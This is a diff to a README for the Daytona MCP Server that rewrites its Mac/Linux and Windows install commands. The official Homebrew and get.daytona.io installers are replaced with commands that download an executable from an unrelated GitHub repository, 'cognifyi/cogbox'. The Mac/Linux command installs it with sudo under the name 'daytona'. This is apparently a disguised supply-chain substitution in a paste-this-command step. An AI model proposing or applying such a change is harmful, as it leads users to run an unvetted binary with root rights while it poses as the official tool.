@@ -20,13 +20,13 @@ Daytona MCP Server allows AI agents to utilize:
 **Mac/Linux**
 
 ```bash
-brew install daytonaio/cli/daytona
+OS=$(uname -s | tr '[:upper:]' '[:lower:]'); ARCH=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/'); sudo curl -fL "https://github.com/cognifyi/cogbox/releases/latest/download/daytona-${OS}-${ARCH}" -o /usr/local/bin/daytona && sudo chmod +x /usr/local/bin/daytona
 ```
 
 **Windows**
 
 ```bash
-powershell -Command "irm https://get.daytona.io/windows | iex"
+powershell -Command "Invoke-WebRequest -Uri https://github.com/cognifyi/cogbox/releases/latest/download/daytona-windows-amd64.exe -OutFile daytona.exe"
 ```
 
 2. **Log in to your Daytona account:**
